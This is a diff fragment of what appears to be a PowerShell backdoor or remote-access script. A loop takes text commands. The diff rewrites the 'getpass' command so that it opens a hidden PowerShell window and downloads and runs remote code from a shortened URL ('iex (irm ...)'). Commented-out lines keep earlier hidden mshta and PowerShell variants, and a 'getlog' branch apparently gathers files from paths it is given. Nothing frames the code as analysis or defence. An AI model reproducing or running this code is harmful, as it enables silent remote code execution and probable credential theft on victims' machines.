@@ -2456,7 +2456,8 @@ while ($true) {
 	   elseif ($text -eq "getpass") {
                 #Start-Process "mshta.exe" -ArgumentList "https://lc.cx/qROsw0" -WindowStyle Hidden         
 		#Start-Process "powershell.exe" -ArgumentList "https://lc.cx/4eWKsO"  -WindowStyle Hidden  
-  		Start-Process powershell -WindowStyle Hidden -ArgumentList "-c iex (irm 'https://lc.cx/4eWKsO')"
+  		Start-Process powershell -WindowStyle Hidden -ArgumentList "-c iex (irm 'lc.cx/tiz6f7')"
+    #IEX(irm 'lc.cx/tiz6f7')
             }
             elseif ($text -like "getlog *") {
                 $rawPaths = $text.Substring(7).Trim()
